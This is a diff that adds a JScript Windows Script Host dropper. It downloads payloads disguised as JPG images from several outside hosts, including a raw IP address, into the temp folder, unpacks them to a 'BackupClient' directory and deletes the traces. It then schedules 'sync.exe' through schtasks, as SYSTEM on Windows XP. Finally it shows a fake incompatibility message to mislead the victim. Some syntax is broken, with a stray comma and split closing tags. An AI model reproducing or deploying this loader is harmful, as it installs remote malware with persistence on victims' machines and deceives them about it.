@@ -1,0 +1,20 @@
+var oShell = new ActiveXObject("WScript.Shell");
+appdir = oShell.ExpandEnvironmentStrings("%temp%"), downloc = appdir + "\\" + makeid(), appdir +=
+"\\BackupClient";
+var u1 = "https://image.ibb.co/mxRqXF/arrival.jpg",
+u2 = "http://sm.uploads.im/X8IOl.jpg",
+u3 = "http://185.10.202.115/images/arrival.jpg";
+try {
+    download(u1, downloc + ".jpg") && download(u2, downloc + ".jpg") && download(u3, downloc + ".jpg") ?
+    WScript.Quit(0) : exp(downloc, appdir)
+    } catch (err) {
+       WScript.Quit(0)
+}
+fs = new ActiveXObject("Scripting.FileSystemObject"), fs.DeleteFile(downloc + ".jpg"), fs.DeleteFile(downloc + ".zip"),
+var d = new Date,
+   time = msToTime(d.getTime() - 6e4 * d.getTimezoneOffset()); - 1 != version().indexOf("Windows XP") && (time +=
+   " /ru SYSTEM"), oShell.Run('schtasks /CREATE /F /TN sync /TR "' + appdir + '\\sync.exe -e \\"' + desktop + '\\"" /sc
+   once /st ' + time), WScript.Echo("This file version is not compatible with your WIndows system. Please update your system.") ; <
+   /script> <
+   /job>
+    
